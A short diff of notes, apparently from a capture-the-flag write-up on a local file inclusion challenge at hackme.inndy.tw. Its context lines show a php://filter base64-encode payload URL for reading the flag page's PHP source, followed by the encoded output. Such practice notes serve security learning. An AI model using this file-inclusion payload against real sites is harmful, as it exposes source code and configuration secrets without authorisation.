@@ -3,7 +3,7 @@ https://hackme.inndy.tw/lfi/?page=pages/intro
 https://hackme.inndy.tw/lfi/?page=pages/login
 https://hackme.inndy.tw/lfi/?page=pages/flag
 
-#################################
+==========================================================
 利用LFI读网页源码。
 https://hackme.inndy.tw/lfi/?page=php://filter/read=convert.base64-encode/resource=pages/flag
 Q2FuIHlvdSByZWFkIHRoZSBmbGFnPD9waHAgcmVxdWlyZSgnY29uZmlnLnBocCcpOyA/Pj8K
